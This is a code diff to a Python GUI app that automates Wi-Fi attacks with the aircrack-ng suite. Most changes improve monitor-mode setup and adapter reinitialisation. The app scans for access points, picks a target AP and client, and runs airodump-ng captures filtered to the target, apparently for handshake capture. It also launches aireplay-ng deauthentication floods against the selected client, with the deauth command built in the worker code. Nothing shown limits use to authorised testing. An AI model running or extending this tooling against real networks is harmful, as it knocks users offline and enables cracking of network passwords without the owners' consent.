@@ -99,29 +99,106 @@ def iface_is_monitor(iface: str) -> bool:
 
 def kill_interfering() -> None:
     run(["airmon-ng", "check", "kill"])
+    time.sleep(0.5)
 
 
 def unblock_radio() -> None:
     run(["rfkill", "unblock", "wifi"])
     run(["rfkill", "unblock", "all"])
+    time.sleep(0.2)
 
 
-def enable_monitor(iface: str) -> None:
-    unblock_radio()
+def _iface_cycle(iface: str) -> None:
+    """Down/up cycle — fixes 'device not initialized' on many USB adapters."""
     run(["ip", "link", "set", iface, "down"])
+    time.sleep(0.6)
+    run(["ip", "link", "set", iface, "up"])
+    time.sleep(1.0)
+
+
+def enable_monitor(iface: str) -> str:
+    """
+    Put adapter into monitor mode. Returns the interface name to use with airodump
+    (may be wlan0mon if airmon-ng created it).
+    """
+    kill_interfering()
+    unblock_radio()
+
+    before = set(list_wireless_ifaces())
+
+    # Prefer airmon-ng start — initializes firmware better on many chipsets
+    run(["airmon-ng", "start", iface])
+    time.sleep(1.5)
+    after = set(list_wireless_ifaces())
+
+    candidates = sorted(after - before) + sorted(after)
+    seen: set[str] = set()
+    for cand in candidates:
+        if cand in seen:
+            continue
+        seen.add(cand)
+        if iface_is_monitor(cand):
+            _iface_cycle(cand)
+            run(["iw", "dev", cand, "set", "channel", "1"])
+            time.sleep(0.4)
+            return cand
+
+    # Fallback: iw set type monitor on original iface
+    run(["ip", "link", "set", iface, "down"])
+    time.sleep(0.4)
     r = run(["iw", "dev", iface, "set", "type", "monitor"])
     if r.returncode != 0:
-        raise RuntimeError(r.stderr.strip() or f"Failed to set {iface} to monitor mode")
+        r2 = run(["iwconfig", iface, "mode", "monitor"])
+        if r2.returncode != 0:
+            raise RuntimeError(
+                (r.stderr or r2.stderr or "").strip()
+                or f"Failed to set {iface} to monitor mode"
+            )
     run(["ip", "link", "set", iface, "up"])
+    time.sleep(0.8)
+    # Second cycle — common fix when airodump hops but sees 0 APs
+    _iface_cycle(iface)
     if not iface_is_monitor(iface):
         raise RuntimeError(f"Failed to switch {iface} into monitor mode")
+    run(["iw", "dev", iface, "set", "channel", "1"])
+    time.sleep(0.4)
+    return iface
 
 
-def restore_managed(iface: str) -> None:
+def reinit_monitor(iface: str) -> None:
+    """Re-init monitor iface when airodump shows empty (device not initialized)."""
+    unblock_radio()
+    kill_interfering()
+    _iface_cycle(iface)
+    if not iface_is_monitor(iface):
+        run(["ip", "link", "set", iface, "down"])
+        time.sleep(0.3)
+        run(["iw", "dev", iface, "set", "type", "monitor"])
+        run(["ip", "link", "set", iface, "up"])
+        time.sleep(0.8)
+        _iface_cycle(iface)
+    run(["iw", "dev", iface, "set", "freq", "2412"])  # ch 1
+    # freq may fail on some; try channel
+    run(["iw", "dev", iface, "set", "channel", "1"])
+    time.sleep(0.5)
+
+
+def restore_managed(iface: str, base_iface: str | None = None) -> None:
+    """Restore managed mode. Handles wlan0mon from airmon-ng."""
+    base = base_iface or iface
+    if iface.endswith("mon") or "mon" in iface:
+        run(["airmon-ng", "stop", iface])
+        time.sleep(0.8)
     run(["ip", "link", "set", iface, "down"])
     run(["iw", "dev", iface, "set", "type", "managed"])
     run(["ip", "link", "set", iface, "up"])
+    # Also try restoring the original name
+    if base != iface:
+        run(["ip", "link", "set", base, "down"])
+        run(["iw", "dev", base, "set", "type", "managed"])
+        run(["ip", "link", "set", base, "up"])
     run(["systemctl", "restart", "NetworkManager"])
+    time.sleep(0.5)
 
 
 def safe_name(essid: str) -> str:
@@ -310,6 +387,7 @@ class App:
 
         self.step = "interface"
         self.iface = StringVar(value="")
+        self.mon_iface = StringVar(value="")  # actual monitor iface (may be wlan0mon)
         self.monitor_on = BooleanVar(value=False)
         self.scan_duration = IntVar(value=15)
         self.client_duration = IntVar(value=20)
@@ -625,20 +703,27 @@ class App:
         row = Frame(p, bg=C["panel"])
         row.pack(fill=X, pady=8)
         self._btn(row, "Enable monitor mode", self.enable_monitor_step).pack(side=LEFT, padx=(0, 8))
+        self._btn(row, "Reinit adapter", self.reinit_monitor_step).pack(side=LEFT, padx=(0, 8))
         self._btn(row, "Restore managed mode", self.restore_monitor_step, danger=True).pack(side=LEFT)
 
         Label(
             p,
-            text="airmon-ng check kill  →  iw set type monitor  →  interface up",
+            text="airmon-ng start (preferred) → down/up reinit → set channel 1\n"
+            "If airodump hops but shows 0 APs, click Reinit adapter then scan again.",
             bg=C["panel"],
             fg=C["muted"],
             font=("Consolas", 9),
+            justify="left",
         ).pack(anchor="w", pady=(16, 0))
 
         nav = Frame(p, bg=C["panel"])
         nav.pack(fill=X, side="bottom", pady=(8, 0))
         self._btn(nav, "← Back", lambda: self.show_step("interface")).pack(side=LEFT)
         self._btn(nav, "Continue to Scan →", lambda: self.next_step("scan")).pack(side=RIGHT)
+
+    def mon(self) -> str:
+        """Interface name to pass to airodump (monitor iface)."""
+        return self.mon_iface.get().strip() or self.iface.get().strip()
 
     def enable_monitor_step(self) -> None:
         iface = self.iface.get()
@@ -649,26 +734,45 @@ class App:
             messagebox.showerror("Root required", "Run with sudo.")
             return
         try:
-            self.log_msg("Stopping interfering processes (airmon-ng check kill)…")
-            kill_interfering()
-            self.log_msg(f"Enabling monitor mode on {iface}…")
-            enable_monitor(iface)
+            self.log_msg("Stopping interfering processes + enabling monitor (airmon-ng/iw)…")
+            mon = enable_monitor(iface)
+            self.mon_iface.set(mon)
             self.monitor_on.set(True)
-            self.monitor_status.set(f"Monitor mode: ON  ({iface})")
-            self.log_msg(f"Monitor mode enabled on {iface}")
+            extra = f"  [from {iface}]" if mon != iface else ""
+            self.monitor_status.set(f"Monitor mode: ON  ({mon}){extra}")
+            self.log_msg(f"Monitor ready on {mon}. If scan is empty, click Reinit adapter.")
+            self.refresh_ifaces()
         except Exception as exc:
             self.log_msg(f"ERROR: {exc}")
             messagebox.showerror("Monitor mode failed", str(exc))
 
+    def reinit_monitor_step(self) -> None:
+        iface = self.mon()
+        if not iface:
+            messagebox.showinfo("No interface", "Enable monitor mode first.")
+            return
+        try:
+            self.log_msg(f"Reinitializing {iface} (down/up + channel 1)…")
+            reinit_monitor(iface)
+            self.monitor_on.set(True)
+            self.monitor_status.set(f"Monitor mode: ON  ({iface})  [reinitialized]")
+            self.log_msg(f"Reinit done on {iface} — try Start scan again.")
+        except Exception as exc:
+            self.log_msg(f"ERROR: {exc}")
+            messagebox.showerror("Reinit failed", str(exc))
+
     def restore_monitor_step(self) -> None:
-        iface = self.iface.get()
+        iface = self.mon()
+        base = self.iface.get()
         if not iface:
             return
         try:
-            restore_managed(iface)
+            restore_managed(iface, base_iface=base)
             self.monitor_on.set(False)
-            self.monitor_status.set(f"Monitor mode: off  ({iface} managed)")
-            self.log_msg(f"Restored managed mode on {iface}")
+            self.mon_iface.set("")
+            self.monitor_status.set(f"Monitor mode: off  ({base or iface} managed)")
+            self.log_msg("Restored managed mode")
+            self.refresh_ifaces()
         except Exception as exc:
             self.log_msg(f"ERROR: {exc}")
 
@@ -715,9 +819,9 @@ class App:
         self._btn(nav, "Use selection as Target →", self.scan_to_target).pack(side=RIGHT)
 
     def start_scan(self) -> None:
-        iface = self.iface.get()
+        iface = self.mon()
         if not iface:
-            messagebox.showinfo("No interface", "Select an interface first.")
+            messagebox.showinfo("No interface", "Select an interface and enable monitor first.")
             return
         if self.busy:
             self.log_msg("Scan already running — use Stop & load results, or Stop all.")
@@ -777,13 +881,17 @@ class App:
         err = None
         csv_path = None
         try:
+            base = self.iface.get() or iface
             if not iface_is_monitor(iface):
                 self.root.after(0, lambda: self.log_msg("Enabling monitor mode for scan…"))
-                kill_interfering()
-                enable_monitor(iface)
+                mon = enable_monitor(base)
+                iface = mon
+                self.root.after(0, lambda m=mon: self.mon_iface.set(m))
                 self.root.after(0, lambda: self.monitor_on.set(True))
             else:
-                unblock_radio()
+                # Always reinit before scan — fixes empty airodump / not initialized
+                self.root.after(0, lambda: self.log_msg(f"Reinit {iface} before scan…"))
+                reinit_monitor(iface)
 
             info = run(["iw", "dev", iface, "info"]).stdout
             self.root.after(
@@ -794,8 +902,6 @@ class App:
             prefix = SCAN_DIR / f"scan-{ts}"
             self.scan_prefix = prefix
 
-            # Same as: sudo airodump-ng wlan0
-            # plus -w so we can load APs into the table after.
             cmd = [
                 "airodump-ng",
                 "-w",
@@ -806,15 +912,14 @@ class App:
             ]
             self.root.after(0, lambda: self.log_msg("CMD: " + " ".join(cmd)))
 
-            # Live terminal (matches manual airodump). Headless mode often sees 0 APs
-            # on some USB chipsets when stdout is discarded.
             if find_terminal() is not None:
                 proc = open_in_terminal(cmd)
                 self.procs.append(proc)
                 self.root.after(
                     0,
                     lambda: self.log_msg(
-                        f"Live airodump window opened for {duration}s — watch networks there."
+                        f"Live airodump window opened for {duration}s — watch networks there.\n"
+                        "If still empty after a few seconds: Stop all → Monitor → Reinit → Scan."
                     ),
                 )
                 time.sleep(duration)
@@ -841,8 +946,8 @@ class App:
             if not csv_path.is_file():
                 raise RuntimeError(
                     "No scan CSV produced.\n"
-                    f"Check the airodump window and that {iface} is in monitor mode.\n"
-                    f"Manual test: sudo airodump-ng {iface}"
+                    f"Try: Monitor → Reinit adapter, then scan again.\n"
+                    f"Manual: sudo airodump-ng {iface}"
                 )
         except Exception as exc:
             err = str(exc)
@@ -858,10 +963,11 @@ class App:
             if not self.networks:
                 messagebox.showinfo(
                     "No APs found",
-                    "airodump finished but CSV had no APs.\n\n"
-                    "If the live window showed networks, click Stop & load results, "
-                    "or run longer.\n"
-                    f"Manual: sudo airodump-ng {self.iface.get()}",
+                    "airodump finished but saw 0 APs (often 'device not initialized').\n\n"
+                    "1) Stop all\n"
+                    "2) Monitor → Reinit adapter\n"
+                    "3) Scan again (15–30s)\n\n"
+                    f"Manual test: sudo airodump-ng {self.mon()}",
                 )
 
         self.root.after(0, finish)
@@ -987,7 +1093,7 @@ class App:
         if not self.selected_ap:
             messagebox.showinfo("No AP", "Select an access point first.")
             return
-        iface = self.iface.get()
+        iface = self.mon()
         if not iface:
             return
         if self.busy:
@@ -1074,11 +1180,15 @@ class App:
         err = None
         csv_path = None
         try:
+            base = self.iface.get() or iface
             if not iface_is_monitor(iface):
-                kill_interfering()
-                enable_monitor(iface)
-            unblock_radio()
-            run(["iw", "dev", iface, "set", "channel", str(ap["ch"])])
+                mon = enable_monitor(base)
+                iface = mon
+                self.root.after(0, lambda m=mon: self.mon_iface.set(m))
+            else:
+                reinit_monitor(iface)
+            run(["iw", "dev", iface, "set", "channel", str(ap["ch"]).strip()])
+            time.sleep(0.4)
 
             ts = datetime.now().strftime("%Y%m%d-%H%M%S")
             prefix = CAPTURE_DIR / f"clients-{safe_name(ap['essid'])}-{ts}"
@@ -1239,28 +1349,33 @@ class App:
         if not self.selected_ap:
             messagebox.showinfo("No AP", "Select a target AP first.")
             return
-        iface = self.iface.get()
+        iface = self.mon()
+        base = self.iface.get() or iface
         ap = self.selected_ap
         name = Path(self.capture_name.get().strip() or f"Capture-{safe_name(ap['essid'])}").name
         prefix = CAPTURE_DIR / name
-        cmd = [
-            "airodump-ng",
-            "-c",
-            str(ap["ch"]),
-            "-w",
-            str(prefix),
-            "-d",
-            ap["bssid"],
-            iface,
-        ]
-        self.log_msg("CMD: " + " ".join(cmd))
 
         def worker() -> None:
             try:
-                if not iface_is_monitor(iface):
-                    kill_interfering()
-                    enable_monitor(iface)
-                run(["iw", "dev", iface, "set", "channel", str(ap["ch"])])
+                mon = iface
+                if not iface_is_monitor(mon):
+                    mon = enable_monitor(base)
+                    self.root.after(0, lambda m=mon: self.mon_iface.set(m))
+                else:
+                    reinit_monitor(mon)
+                run(["iw", "dev", mon, "set", "channel", str(ap["ch"])])
+                time.sleep(0.3)
+                cmd = [
+                    "airodump-ng",
+                    "-c",
+                    str(ap["ch"]),
+                    "-w",
+                    str(prefix),
+                    "-d",
+                    ap["bssid"],
+                    mon,
+                ]
+                self.root.after(0, lambda: self.log_msg("CMD: " + " ".join(cmd)))
                 proc = open_in_terminal(cmd)
                 self.procs.append(proc)
                 self.root.after(
@@ -1283,28 +1398,31 @@ class App:
         if not self.selected_client:
             messagebox.showinfo("No client", "Select a client on the Target step.")
             return
-        iface = self.iface.get()
+        iface = self.mon()
+        base = self.iface.get() or iface
         ap = self.selected_ap
         cl = self.selected_client
         count = int(self.deauth_count.get())
-        cmd = [
-            "aireplay-ng",
-            "--deauth",
-            str(count),
-            "-a",
-            ap["bssid"],
-            "-c",
-            cl["station"],
-            iface,
-        ]
-        self.log_msg("CMD: " + " ".join(cmd))
 
         def worker() -> None:
             try:
-                if not iface_is_monitor(iface):
-                    kill_interfering()
-                    enable_monitor(iface)
-                run(["iw", "dev", iface, "set", "channel", str(ap["ch"])])
+                mon = iface
+                if not iface_is_monitor(mon):
+                    mon = enable_monitor(base)
+                    self.root.after(0, lambda m=mon: self.mon_iface.set(m))
+                run(["iw", "dev", mon, "set", "channel", str(ap["ch"])])
+                time.sleep(0.3)
+                cmd = [
+                    "aireplay-ng",
+                    "--deauth",
+                    str(count),
+                    "-a",
+                    ap["bssid"],
+                    "-c",
+                    cl["station"],
+                    mon,
+                ]
+                self.root.after(0, lambda: self.log_msg("CMD: " + " ".join(cmd)))
                 proc = open_in_terminal(cmd)
                 self.procs.append(proc)
                 proc.wait()
@@ -1438,12 +1556,14 @@ class App:
         run(["pkill", "-f", "airodump-ng"])
         run(["pkill", "-f", "aireplay-ng"])
         run(["pkill", "-f", "aircrack-ng"])
-        iface = self.iface.get()
+        iface = self.mon()
+        base = self.iface.get()
         if iface:
             try:
-                restore_managed(iface)
+                restore_managed(iface, base_iface=base)
                 self.monitor_on.set(False)
-                self.monitor_status.set(f"Monitor mode: off  ({iface} managed)")
+                self.mon_iface.set("")
+                self.monitor_status.set(f"Monitor mode: off  ({base or iface} managed)")
             except Exception as exc:
                 self.log_msg(f"Restore error: {exc}")
         self.busy = False
